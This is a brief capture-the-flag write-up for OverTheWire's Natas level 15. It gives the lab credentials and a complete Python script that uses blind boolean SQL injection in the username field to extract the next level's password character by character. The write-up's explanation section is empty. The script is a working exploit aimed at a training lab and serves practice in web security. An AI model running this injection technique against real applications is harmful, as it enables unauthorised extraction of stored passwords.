## Username
natas15

## Password
SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

## Write-Up
```python
import requests #Easily HTTP Request
import string

#information to connect
url="http://natas15.natas.labs.overthewire.org/index.php"
username='natas15'
password='SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'
auth=(username,password)

#Maintaining session
session=requests.Session()
session.auth=auth

final_password=""

#Making Alphabet + Numeric
charset=string.ascii_letters+string.digits

print('Start')

for i in range(1,33): #Password is 32 characters
    for char in charset:
        payload={'username': f'natas16" and substring(password,{i},1)=BINARY \'{char}\' -- -'}

        #Sending data   
        res=session.post(url,data=payload)

        #Checking results
        if "This user exists." in res.text:
            final_password+=char
            print(final_password)
            break
            
print('End')
```

## Method of solve
